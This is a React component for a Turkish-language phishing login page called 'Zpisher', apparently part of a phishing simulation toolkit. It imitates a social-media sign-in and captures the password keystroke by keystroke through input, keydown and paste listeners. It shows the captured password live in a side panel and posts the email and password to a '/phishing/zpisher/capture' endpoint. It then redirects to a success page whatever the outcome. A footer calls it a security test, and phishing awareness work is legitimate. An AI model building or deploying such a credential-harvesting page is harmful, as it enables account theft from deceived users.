import { useState, useEffect, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import './Zpisher.css'
function Zpisher() {
  const navigate = useNavigate()
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [capturedPassword, setCapturedPassword] = useState('')
  const [isTyping, setIsTyping] = useState(false)
  const [showPanel, setShowPanel] = useState(true)
  const passwordRef = useRef(null)
  useEffect(() => {
    const handleInput = (e) => {
      if (e.target === passwordRef.current) {
        setIsTyping(true)
        setCapturedPassword(e.target.value)
        setTimeout(() => setIsTyping(false), 300)
      }
    }
    const handleKeyDown = (e) => {
      if (passwordRef.current === document.activeElement) {
        setIsTyping(true)
        setTimeout(() => setIsTyping(false), 300)
      }
    }
    const inputElement = passwordRef.current
    if (inputElement) {
      inputElement.addEventListener('input', handleInput)
      inputElement.addEventListener('keydown', handleKeyDown)
      inputElement.addEventListener('paste', handleInput)
    }
    return () => {
      if (inputElement) {
        inputElement.removeEventListener('input', handleInput)
        inputElement.removeEventListener('keydown', handleKeyDown)
        inputElement.removeEventListener('paste', handleInput)
      }
    }
  }, [])
  const handleSubmit = async (e) => {
    e.preventDefault()
    if (!email || !password) {
      alert('Lütfen tüm alanları doldurun')
      return
    }
    try {
      const response = await fetch('/api/v1/phishing/zpisher/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password, capturedPassword })
      })
      const data = await response.json()
      if (data.ok) {
        setTimeout(() => {
          navigate('/phishing/success')
        }, 1000)
      } else {
        setTimeout(() => {
          navigate('/phishing/success')
        }, 1000)
      }
    } catch (error) {
      setTimeout(() => {
        navigate('/phishing/success')
      }, 1000)
    }
  }
  return (
    <div className="zpisher-container">
      {!showPanel && (
        <button 
          className="zpisher-panel-toggle" 
          onClick={() => setShowPanel(true)}
          title="Paneli Göster"
        >
          ●
        </button>
      )}
      <div className="zpisher-panel" style={{ display: showPanel ? 'block' : 'none' }}>
        <div className="zpisher-panel-header">
          <h3>Zpisher - Anlık Şifre Takibi</h3>
          <button className="zpisher-panel-close" onClick={() => setShowPanel(false)}>×</button>
        </div>
        <div className="zpisher-panel-content">
          <div className="zpisher-status">
            <div className={`zpisher-status-indicator ${isTyping ? 'typing' : ''}`}></div>
            <span>{isTyping ? 'Yazıyor...' : 'Bekliyor'}</span>
          </div>
          <div className="zpisher-captured">
            <label>Yakalanan Şifre (Anlık):</label>
            <div className="zpisher-password-display">
              {capturedPassword || '(Henüz yazılmadı)'}
            </div>
            <div className="zpisher-stats">
              <div className="zpisher-stat">
                <span className="zpisher-stat-label">Karakter Sayısı:</span>
                <span className="zpisher-stat-value">{capturedPassword.length}</span>
              </div>
              <div className="zpisher-stat">
                <span className="zpisher-stat-label">Son Güncelleme:</span>
                <span className="zpisher-stat-value">{new Date().toLocaleTimeString('tr-TR')}</span>
              </div>
            </div>
          </div>
          <div className="zpisher-actions">
            <button className="zpisher-btn-secondary" onClick={() => setCapturedPassword('')}>
              Temizle
            </button>
            <button className="zpisher-btn-secondary" onClick={() => setShowPanel(false)}>
              Gizle
            </button>
          </div>
        </div>
      </div>
      <div className="zpisher-main">
        <div className="zpisher-header">
          <div className="zpisher-logo">
            <svg width="103" height="29" viewBox="0 0 103 29" fill="none">
              <path d="M63.394 16.488c0 1.98-1.608 3.588-3.588 3.588s-3.588-1.608-3.588-3.588 1.608-3.588 3.588-3.588 3.588 1.608 3.588 3.588zm5.76 0c0-5.16-4.188-9.348-9.348-9.348s-9.348 4.188-9.348 9.348 4.188 9.348 9.348 9.348 9.348-4.188 9.348-9.348zm9.348 0c0 8.184-6.636 14.82-14.82 14.82-8.184 0-14.82-6.636-14.82-14.82S45.498 1.668 53.682 1.668c8.184 0 14.82 6.636 14.82 14.82z" fill="#262626"/>
              <path d="M78.182 16.488c0-1.98 1.608-3.588 3.588-3.588s3.588 1.608 3.588 3.588-1.608 3.588-3.588 3.588-3.588-1.608-3.588-3.588z" fill="#262626"/>
              <path d="M85.358 16.488c0-5.16 4.188-9.348 9.348-9.348s9.348 4.188 9.348 9.348-4.188 9.348-9.348 9.348-9.348-4.188-9.348-9.348z" fill="#262626"/>
            </svg>
          </div>
        </div>
        <div className="zpisher-content">
          <div className="zpisher-form-container">
            <h2>Giriş Yap</h2>
            <p className="zpisher-subtitle">Hesabınıza giriş yapmak için bilgilerinizi girin</p>
            <form onSubmit={handleSubmit}>
              <div className="zpisher-form-group">
                <input
                  type="email"
                  placeholder="E-posta adresi veya kullanıcı adı"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  className="zpisher-input"
                />
              </div>
              <div className="zpisher-form-group">
                <input
                  ref={passwordRef}
                  type="password"
                  placeholder="Şifre"
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value)
                    setCapturedPassword(e.target.value)
                  }}
                  required
                  className="zpisher-input"
                />
              </div>
              <div className="zpisher-form-options">
                <label className="zpisher-checkbox">
                  <input type="checkbox" />
                  <span>Beni hatırla</span>
                </label>
                <a href="#" className="zpisher-link">Şifreni mi unuttun?</a>
              </div>
              <button type="submit" className="zpisher-btn-primary">
                Giriş Yap
              </button>
            </form>
            <div className="zpisher-divider">
              <span>veya</span>
            </div>
            <button className="zpisher-btn-secondary">
              Facebook ile Giriş Yap
            </button>
            <div className="zpisher-signup">
              <p>Hesabın yok mu? <a href="#" className="zpisher-link">Kayıt Ol</a></p>
            </div>
          </div>
        </div>
        <div className="zpisher-footer">
          <p>Bu bir güvenlik testidir. Gerçek bir giriş sayfası değildir.</p>
        </div>
      </div>
    </div>
  )
}
export default Zpisher
